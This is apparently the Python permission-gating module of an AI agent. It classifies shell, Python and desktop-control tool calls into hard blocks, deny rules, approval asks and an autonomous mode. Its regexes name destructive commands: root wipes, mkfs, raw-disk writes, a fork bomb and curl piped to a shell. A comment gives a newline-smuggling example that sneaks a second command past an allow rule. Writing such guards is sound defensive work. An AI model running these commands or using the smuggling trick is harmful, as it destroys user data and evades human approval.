from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Callable


HARDLINE_PATTERNS: list[tuple[re.Pattern, str]] = [
    # root ONLY (followed by whitespace/quote-paren/end) — 'rm -rf /tmp/cache'
    # is normal cleanup and belongs to the guardrail-ask tier, not hardline;
    # the quote/paren alternative catches the same wipe embedded in a python
    # or shell string: os.system('rm -rf /')
    (re.compile(r"""\brm\s+(-[a-z]*\s+)*-?[rf]{1,2}[a-z-]*\s+(--\s+)?/(?:[\s,'")]|$)""", re.IGNORECASE), "rm -rf on filesystem root"),
    (re.compile(r"--no-preserve-root", re.IGNORECASE), "no-preserve-root bypass flag"),
    (re.compile(r"\brm\s+(-[a-z]*\s+)*-?[rf]{1,2}[a-z-]*\s+(--\s+)?(/(etc|usr|bin|sbin|var|lib|boot|home|users|system)|~|\$HOME)\b", re.IGNORECASE), "rm -rf on system/user root"),
    (re.compile(r"\bmkfs(\.\w+)?\b", re.IGNORECASE), "mkfs formats a filesystem"),
    (re.compile(r"\bdd\b[^|]*\bof=/dev/(sd[a-z]|nvme|hd[a-z]|disk)", re.IGNORECASE), "dd writing to raw device"),
    (re.compile(r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"), "fork bomb"),
    (re.compile(r"\b(shutdown|poweroff|halt)(\s|$)", re.IGNORECASE), "shutdown/halt command"),
    (re.compile(r"\bformat\s+c:\b", re.IGNORECASE), "format system drive"),
    (re.compile(r"Remove-Item\s+.*-Recurse.*-Force\s+[A-Za-z]:\\\s*$", re.IGNORECASE), "recursive force delete of drive root"),
    (re.compile(r"\bdel\b\s+/[sq]\s+/[qs]\s+C:\\\s*$", re.IGNORECASE), "del /s /q on drive root"),
]

DANGEROUS_PATTERNS: list[tuple[re.Pattern, str]] = [
    (re.compile(r"\bsudo\b", re.IGNORECASE), "elevated privileges (sudo)"),
    (
        re.compile(
            r"(?:curl|wget|iwr|Invoke-WebRequest)\b[^\n|]*\|\s*(?:iex\b|bash\b|sh\b)",
            re.IGNORECASE,
        ),
        "pipe download into shell",
    ),
    (re.compile(r"\bgit\s+push\s+(--force|-f)\b", re.IGNORECASE), "force push"),
    (re.compile(r"\bdrop\s+(table|database)\b", re.IGNORECASE), "destructive SQL drop"),
    (re.compile(r"\bchmod\s+(-R\s+)?777\s+/\s*$", re.IGNORECASE), "chmod 777 on root"),
    (re.compile(r"\breg\s+delete\b", re.IGNORECASE), "registry deletion"),
    (re.compile(r">\s*/dev/sd[a-z]", re.IGNORECASE), "redirect to raw device"),
]

# Irreversible data loss: legitimate operations, but they deserve friction even
# when safety is off — the net under "the agent deleted my database". These ask
# whenever an approver is available and BLOCK when none is (fail-closed),
# regardless of safety mode or autonomy scopes. Disable explicitly via config
# (destructive_guardrails=false) or SATURDAY_GUARDRAILS=0.
GUARDRAIL_PATTERNS: list[tuple[re.Pattern, str]] = [
    (re.compile(r"\bdrop\s+database\b", re.IGNORECASE), "DROP DATABASE destroys an entire database"),
    (re.compile(r"\bdrop\s+schema\b", re.IGNORECASE), "DROP SCHEMA destroys schema objects"),
    (re.compile(r"\bdrop\s+table\b", re.IGNORECASE), "DROP TABLE destroys the table and its data"),
    (re.compile(r"\btruncate\s+table\b", re.IGNORECASE), "TRUNCATE TABLE empties the table irrecoverably"),
    (re.compile(r"\bdrop\s+collection\b", re.IGNORECASE), "DROP COLLECTION destroys the collection"),
    (re.compile(r"\bflushall\b|\bflushdb\b", re.IGNORECASE), "Redis FLUSHALL/FLUSHDB wipes the dataset"),
    (re.compile(r"\bgit\s+reset\s+--hard\b", re.IGNORECASE), "git reset --hard discards uncommitted work"),
    (re.compile(r"\bgit\s+clean\b[^;&|\n]*\s-[a-z]*[fdx]", re.IGNORECASE), "git clean -f/-x deletes untracked files"),
    (re.compile(r"\brm\s+(-\w+\s+)*-\w*r", re.IGNORECASE), "recursive rm deletes directory trees"),
    (re.compile(r"remove-item\b[^;&|\n]*-recurse", re.IGNORECASE), "Remove-Item -Recurse deletes directory trees"),
    (re.compile(r"\b(rd|rmdir|del)\b[^&|;\n]*\s/[sq]\b", re.IGNORECASE), "rd/del /s /q deletes recursively without prompting"),
    (re.compile(r"\bshred\b", re.IGNORECASE), "shred overwrites file contents beyond recovery"),
    (re.compile(r"\bshutil\.rmtree\b", re.IGNORECASE), "shutil.rmtree deletes directory trees from Python"),
]

DB_FILE_EXTS = {".db", ".sqlite", ".sqlite3", ".mdb", ".accdb"}

# commands whose targets get snapshotted into .saturday/backup before running
DESTRUCTIVE_CMD_RX = re.compile(
    r"\b(rm|del|remove-item|ri|erase|unlink|shred|drop|truncate|mysql|psql|sqlite3)\b",
    re.IGNORECASE,
)


def _sql_unbounded(text: str) -> str | None:
    """DELETE/UPDATE statements lacking WHERE touch every row."""
    for m in re.finditer(r"\bdelete\s+from\s+([^\s;]+)", text, re.IGNORECASE):
        stmt = text[m.start():].split(";", 1)[0]
        if not re.search(r"\bwhere\b", stmt, re.IGNORECASE):
            return f"DELETE FROM {m.group(1)} without WHERE affects every row"
    for m in re.finditer(r"\bupdate\s+([^\s;]+)\s+set\b", text, re.IGNORECASE):
        stmt = text[m.start():].split(";", 1)[0]
        if not re.search(r"\bwhere\b", stmt, re.IGNORECASE):
            return f"UPDATE {m.group(1)} without WHERE affects every row"
    return None


def guardrail_reason(text: str) -> str | None:
    """Reason string when the command hits an irreversible-data guardrail."""
    for rx, reason in GUARDRAIL_PATTERNS:
        if rx.search(text):
            return reason
    return _sql_unbounded(text)

GATED_TOOLS = ("shell", "python", "pointer", "keyboard", "clipboard", "window")


def _normalize(command: str) -> str:
    return re.sub(r"\s+", " ", command).strip()


_LONG_FLAG_FOLDS = (
    ("--recursive", "-r"),
    ("--force", "-f"),
    ("--no-preserve-root", "--no-preserve-root"),
)


def _fold_long_flags(text: str) -> str:
    """Fold GNU long flags to their short forms so the hardline patterns
    (written against 'rm -rf …') also catch 'rm --recursive --force /'."""
    lowered = text.lower()
    if "--recursive" not in lowered and "--force" not in lowered:
        return text
    out = text
    for long, short in _LONG_FLAG_FOLDS:
        if long == short:
            continue
        out = re.sub(re.escape(long), short, out, flags=re.IGNORECASE)
    return out


# Fully-autonomous aliases (Claude Code's --dangerously-skip-permissions /
# Cursor auto-run parity). All normalize to one canonical mode name.
AUTONOMOUS_MODE = "autonomous"
_MODE_ALIASES = {"yolo": AUTONOMOUS_MODE, "auto": AUTONOMOUS_MODE, "autonomous": AUTONOMOUS_MODE}
KNOWN_MODES = ("ask", "deny", "off", "autonomous")


def normalize_mode(mode: str | None) -> str:
    low = str(mode or "ask").strip().lower()
    return _MODE_ALIASES.get(low, low)


def is_autonomous(policy_or_mode) -> bool:
    mode = policy_or_mode.mode if isinstance(policy_or_mode, ApprovalPolicy) else policy_or_mode
    return normalize_mode(mode) == AUTONOMOUS_MODE


def pointer_signature(args: dict) -> str:
    action = str(args.get("action") or "")
    target = args.get("target")
    if target:
        return f"{action} target={target}"
    parts = [action]
    for key in ("x", "y", "x2", "y2", "dy"):
        if args.get(key) is not None:
            parts.append(f"{key}={args[key]}")
    win = str(args.get("window") or "").strip()
    if win:
        parts.append(f"window={win}")
    return " ".join(parts)


def gate_signature(tool_name: str, args: dict) -> tuple[str, bool]:
    """(signature, gated?) for the pointer-like tools. window:list is read-only."""
    if tool_name == "pointer":
        return pointer_signature(args), True
    if tool_name == "keyboard":
        detail = str(args.get("key") or (args.get("text") or "")[:80])
        win = str(args.get("window") or "").strip()
        if win:
            detail += f" @ {win}"
        return f"{args.get('action')} {detail}", True
    if tool_name == "clipboard":
        preview = (str(args.get("text") or ""))[:60] if args.get("action") == "set" else ""
        return f"{args.get('action')} {preview}".strip(), True
    if tool_name == "app_open":
        return f"open {args.get('target') or ''}".strip(), True
    if tool_name == "window":
        action = str(args.get("action") or "")
        if action == "list":
            return "", False
        return f"{action} {args.get('query') or ''}".strip(), True
    return "", False


@dataclass
class ApprovalPolicy:
    mode: str = "ask"
    approver: Callable[[str, str], bool] | None = None
    # Persistent allow rules (hermes command_allowlist parity): exact
    # normalized commands, or "prefix*" wildcards. Consulted AFTER the
    # hardline floor and deny rules, BEFORE any ask — a saved rule can never
    # bypass hardline. Compound commands (&&, ;, |, ``) never match a rule.
    allow_rules: list[str] = field(default_factory=list)
    # Persistent deny rules ("never, even with safety off" contract). Enforced
    # right after hardline and before every mode bypass or ask, so a saved
    # deny beats safety=off, guardrails, reserved scopes and allow rules.
    deny_rules: list[str] = field(default_factory=list)
    # Hard-blocked app categories (Cowork parity): app_open target, window
    # query or ui window= matching one (case-insensitive substring) is refused
    # in EVERY mode — an explicit user set can never be erased by an agent.
    blocked_apps: list[str] = field(default_factory=list)

    @classmethod
    def from_mode(cls, mode: str | None, approver=None, allow_rules=None, deny_rules=None, blocked_apps=None) -> "ApprovalPolicy":
        return cls(
            mode=normalize_mode(mode),
            approver=approver,
            allow_rules=list(allow_rules or []),
            deny_rules=list(deny_rules or []),
            blocked_apps=list(blocked_apps or []),
        )


def rule_matches(rule: str, command: str) -> bool:
    """Persistent-rule match: exact or trailing-'*' prefix, on ONE normalized
    line. Compound shell operators disqualify so 'cargo *' can never smuggle
    'cargo x && curl|sh' (mirrors hermes _has_allowlist_shell_operator).
    Newlines disqualify too: callers feed rule matching line-split probes
    (see _rule_probes) precisely so a prefix rule can never bridge across a
    folded newline into a smuggled second command."""
    if "\n" in command or "\r" in command:
        return False
    if re.search(r"&&|\|\||;|\||`|\$\(", command):
        return False
    rule = rule.strip()
    if rule.endswith("*"):
        return command.startswith(rule[:-1])
    return command == rule


def _rule_probes(raw: str) -> list[str]:
    """Whitespace-normalized single lines of a raw command/code block, for
    rule matching. Deny rules match per line (a denied shape is denied no
    matter which line of a multiline script carries it); allow rules only
    ever see single-line probes, so 'prefix*' can't leap a newline."""
    return [ln for ln in (re.sub(r"\s+", " ", line).strip() for line in str(raw or "").splitlines()) if ln]


def _is_background_delivery(args: dict) -> bool:
    """Window-targeted input delivery never touches the shared cursor/keyboard focus."""
    return bool(str(args.get("window") or "").strip()) and str(args.get("delivery") or "background") != "foreground"


def _deny_reason(policy: ApprovalPolicy, probe: str) -> str | None:
    """Matched persistent deny rule for a command text (text tools) or gate
    signature (non-text tools), or None. Compound-operator disqualification in
    rule_matches applies here too, mirroring the shared rule syntax."""
    for rule in policy.deny_rules:
        if rule_matches(rule, probe):
            return f"{probe[:120]!r} matches saved deny rule {rule!r}"
    return None


def _user_denial(policy: ApprovalPolicy, reason: str) -> str:
    """Denial message for a human-refused action. If the user attached a note
    to the deny (Claude Code-style "deny with feedback"), it is consumed from
    the approver and passed to the agent so it can adjust instead of retrying
    the identical call."""
    note = ""
    ap = getattr(policy, "approver", None)
    if ap is not None:
        try:
            note = str(ap.consume_denial_note() or "")
        except Exception:
            note = ""
    return f"user denied: {reason}" + (f"\nuser note: {note}" if note else "")


_BLOCK_QUERY_ARG = {
    "app_open": "target",
    "window": "query",
    "ui_invoke": "window",
    "pointer": "window",
    "keyboard": "window",
}


def _block_probe(tool_name: str, args: dict) -> str:
    """The string that identifies the app a desktop tool targets."""
    arg = _BLOCK_QUERY_ARG.get(tool_name)
    if arg is None:
        return ""
    return str(args.get(arg) or "").strip()


def _blocklist_hit(probe: str, blocks: list[str]) -> str | None:
    probe_l = probe.lower()
    for b in blocks:
        if b and b.strip().lower() in probe_l:
            return b.strip()
    return None


SCOPE_TIERS = ("reserved", "approval", "autonomous")


def classify_scope(tool_name: str, scopes: dict | None) -> str | None:
    """Three-tier authorization model (mirrors China's agent Opinions and
    Gartner's approval-granularity axis): reserved (never autonomous — asks
    even with safety off), approval (asks in ask mode), autonomous (never
    asks; deny mode and hardline patterns still apply). Unclassified tools
    keep legacy behavior."""
    if not scopes:
        return None
    for tier in SCOPE_TIERS:
        if tool_name in (scopes.get(tier) or []):
            return tier
    return None


def isolation_enforced() -> bool:
    """Extension point for real isolation executors (container / job-object
    sandbox). NO backend ships in this build: flipping ``cfg.sandboxed`` must
    NOT waive approval friction by itself, because friction is the only
    control that exists today. Callers (agent.core) pass the EFFECTIVE value
    — cfg flag AND this check — into check_command/make_approval_hook, and
    future executors flip this to True when they can actually isolate."""
    return False


def check_command(
    policy: ApprovalPolicy,
    tool_name: str,
    args: dict,
    *,
    background_only: bool = False,
    scopes: dict | None = None,
    guardrails: bool = False,
    sandboxed: bool = False,
) -> str | None:
    """Return block reason or None. Mirrors hermes hardline/recoverable split.

    Precedence waterfall (immutable floor -> mode bypasses -> friction):
      1. hardline patterns   — block in every mode INCLUDING autonomous
                               (rm -rf /, mkfs, fork bomb: the catastrophic
                               floor survives even yolo; hermes does the same)
      2. deny rules          — "never, even with safety off"
      3. background-only     — foreground input delivery blocked structurally
      4. reserved scopes     — governance asks even with safety off
                               (SKIPPED in autonomous: no approver exists)
      5. guardrail patterns  — irreversible-data friction (asks even when off;
                                SKIPPED when ``sandboxed`` or autonomous — an
                                isolated executor / yolo replaces friction)
      6. dangerous patterns  — ask/deny per mode (skipped in autonomous)
      7. scope tiers         — approval/autonomous granularity

    AUTONOMOUS MODE ("yolo"/"auto"): one switch, zero approval prompts —
    dangerous patterns, guardrails and reserved-tier asks are all bypassed.
    The hardline floor, persistent deny rules and background-only structural
    gating still bind. With guardrails disabled and sandboxed False the
    legacy behavior is byte-identical to before this mode existed. KNOWN
    LIMIT (documented, not solved): classification is textual — variable
    indirection or encoded payloads can evade it; treat ``sandboxed=True``
    (container/job-object isolation) as the enforcement layer for unattended
    use, these patterns as friction for attended use."""
    tier = classify_scope(tool_name, scopes)
    raw = ""
    if tool_name == "shell":
        raw = str(args.get("command") or "")
        text = _normalize(raw)
    elif tool_name == "python":
        raw = str(args.get("code") or "")
        text = _normalize(" ".join(re.findall(r"[^\n]+", raw)))
    else:
        # hard app-category blocklist (Cowork parity) outranks EVERYTHING
        # except the catastrophic hardline floor: an agent must never be able
        # to drive itself into a blocked app category in any mode.
        if policy.blocked_apps:
            probe = _block_probe(tool_name, args)
            if probe:
                hit = _blocklist_hit(probe, policy.blocked_apps)
                if hit:
                    return f"BLOCKLISTED (hard block): '{hit}' matches blocked app category"
        # deny rules outrank every mode bypass (including safety=off): probe
        # non-text tools by their gate signature before anything else runs.
        sig, gated = gate_signature(tool_name, args)
        if gated and policy.deny_rules:
            hit = _deny_reason(policy, sig)
            if hit:
                return f"DENIED (persistent rule): {hit}"
        if policy.mode == "off" and not background_only and tier != "reserved":
            return None
        if is_autonomous(policy) and not background_only:
            return None  # zero prompts: dangerous/reserved asks skipped below
        if background_only and tool_name in ("pointer", "keyboard") and not _is_background_delivery(args):
            return (
                "BACKGROUND-ONLY MODE: foreground pointer/keyboard would steal the user's mouse/keyboard; "
                "pass window=<title substring> for non-intrusive background delivery, or use ui_invoke / clipboard"
            )
        if background_only and tool_name == "window" and str(args.get("action")) not in ("list", "close"):
            # close posts WM_CLOSE from the background — no focus steal, allowed
            return "BACKGROUND-ONLY MODE: focus/minimize/maximize steal foreground; use ui_invoke on the background window instead"
        if background_only and tool_name == "ui_invoke":
            # without window= ui_invoke resolves the user's FOCUSED element,
            # and action='focus' steals foreground outright — both are exactly
            # what background-only exists to prevent
            if str(args.get("action")) == "focus":
                return (
                    "BACKGROUND-ONLY MODE: ui_invoke action='focus' steals foreground focus; "
                    "target elements by name with press/set_text/select instead"
                )
            if not str(args.get("window") or "").strip():
                return (
                    "BACKGROUND-ONLY MODE: ui_invoke without window= acts on the user's focused element; "
                    "pass window=<title substring> to stay non-intrusive"
                )
        if tool_name in ("pointer", "keyboard", "clipboard", "window", "app_open"):
            sig, gated = gate_signature(tool_name, args)
            if not gated:
                return None
            if policy.mode == "deny":
                return f"DENIED {tool_name} action: desktop control disabled by policy"
            # per-(action,target) approval memory: a saved rule (exact or
            # 'prefix*') matches the action signature, so "always allow" on
            # 'click target=ok*' stops asking without widening to everything.
            if policy.allow_rules and any(rule_matches(rule, sig) for rule in policy.allow_rules):
                return None
            if (tier == "reserved" or policy.mode == "ask") and not is_autonomous(policy):
                if tier == "autonomous":
                    return None
                reason = f"{tool_name}: {sig}"
                if policy.approver is None:
                    return f"AWAITING APPROVAL unavailable (fail-closed): {reason}"
                try:
                    allowed = bool(policy.approver(sig, reason))
                except Exception:
                    return "approver failed; fail-closed deny"
                if not allowed:
                    return _user_denial(policy, reason)
            return None
        if tier == "reserved" and not is_autonomous(policy):
            reason = f"{tool_name}: reserved scope requires approval"
            if policy.approver is None:
                return f"AWAITING APPROVAL unavailable (fail-closed): {reason}"
            try:
                allowed = bool(policy.approver(reason, reason))
            except Exception:
                return "approver failed; fail-closed deny"
            if not allowed:
                return _user_denial(policy, reason)
        return None
    if not text:
        return "empty command"
    # Rule matching happens on per-line probes of the RAW command: deny rules
    # match any line (containment), allow rules can only suppress asks when the
    # whole command is the single matched line. Matching folded text instead
    # would let 'git status\nsudo curl evil | sh' inherit a 'git status*' rule.
    probes = _rule_probes(raw)
    # hardline binds in EVERY mode — the catastrophic floor (rm -rf /, mkfs,
    # fork bomb) survives safety=off too, not just autonomous; long-form flags
    # fold to short so 'rm --recursive --force /' is caught by the same rules.
    scan = _fold_long_flags(text)
    for rx, reason in HARDLINE_PATTERNS:
        if rx.search(text) or rx.search(scan):
            return f"HARDLINE BLOCK ({reason}); policy={policy.mode}"
    # deny rules sit directly under hardline: they bind in every mode, so a
    # saved "npm publish*" beats safety=off, guardrails, reserved asks and
    # allow rules alike (waterfall step 2).
    if policy.deny_rules:
        for probe in probes:
            hit = _deny_reason(policy, probe)
            if hit:
                return f"DENIED (persistent rule): {hit}"
    autonomous = is_autonomous(policy)
    # "off" keeps its legacy bypass of the dangerous-pattern ASK loop below —
    # the hardline floor above now binds regardless. Guardrails (irreversible
    # data friction) stay exempt from the bypass in every mode.
    off_bypass = policy.mode == "off" and tier != "reserved"
    if guardrails and not sandboxed and not autonomous:
        hit = guardrail_reason(text)
        if hit:
            # the safety net beats autonomy AND safety-off: always friction
            reason = f"irreversible data risk: {hit}"
            if policy.mode == "deny":
                return f"DENIED destructive action: {hit}"
            if policy.approver is None:
                return (
                    f"GUARDRAIL BLOCK ({hit}): approval unavailable in this surface. "
                    "Switch safety mode to 'ask' to approve it in-chat, or explicitly disable "
                    "destructive_guardrails in Settings if you accept the risk."
                )
            try:
                allowed = bool(policy.approver(raw, f"GUARDRAIL: {hit}"))
            except Exception:
                return "approver failed; fail-closed deny"
            if not allowed:
                return _user_denial(policy, reason)
    if off_bypass or autonomous:
        return None  # autonomous/off: dangerous/reserved approval asks skipped
    allow_matched = False
    if policy.allow_rules and tool_name == "shell" and not autonomous:
        # persistent user-approved command shapes (exact or prefix*) skip ONLY
        # the dangerous-pattern ASK loop below. Hardline, guardrails and deny
        # rules above, deny mode below, and the reserved-tier ask after the
        # loop all still apply — a saved rule removes friction, never checks.
        # A saved rule matches the WHOLE command on a single line: multiline
        # commands never inherit suppression (newline smuggling closed).
        allow_matched = len(probes) == 1 and any(rule_matches(rule, probes[0]) for rule in policy.allow_rules)
    asked = False
    for rx, reason in DANGEROUS_PATTERNS:
        if not rx.search(text):
            continue
        if policy.mode == "deny":
            return f"DENIED dangerous command: {reason}"
        if allow_matched:
            continue
        if sandboxed and tier != "reserved":
            continue  # isolated executor: pattern friction is structural there
        if policy.mode == "ask" or tier == "reserved":
            if policy.approver is None:
                return f"AWAITING APPROVAL unavailable (fail-closed): {reason}"
            try:
                # show the RAW command: approval decisions must see the real
                # multiline text, not a whitespace-folded one-line summary
                allowed = bool(policy.approver(raw, reason))
            except Exception:
                return "approver failed; fail-closed deny"
            asked = True
            if not allowed:
                return _user_denial(policy, reason)
    if tier == "reserved" and not asked:
        reason = f"{tool_name}: reserved scope requires approval"
        if policy.approver is None:
            return f"AWAITING APPROVAL unavailable (fail-closed): {reason}"
        try:
            allowed = bool(policy.approver(reason, reason))
        except Exception:
            return "approver failed; fail-closed deny"
        if not allowed:
            return _user_denial(policy, reason)
        return None
    if tier == "approval" and policy.mode == "ask":
        reason = f"{tool_name}: {text[:120]}"
        if policy.approver is None:
            return f"AWAITING APPROVAL unavailable (fail-closed): {reason}"
        try:
            allowed = bool(policy.approver(reason, reason))
        except Exception:
            return "approver failed; fail-closed deny"
        if not allowed:
            return _user_denial(policy, reason)
    return None


def make_approval_hook(
    policy: ApprovalPolicy,
    *,
    background_only: bool = False,
    scopes: dict | None = None,
    guardrails: bool = False,
    sandboxed: bool = False,
):
    def pre_tool_call(tool_name: str, args: dict) -> str | None:
        return check_command(
            policy,
            tool_name,
            args,
            background_only=background_only,
            scopes=scopes,
            guardrails=guardrails,
            sandboxed=sandboxed,
        )

    return pre_tool_call
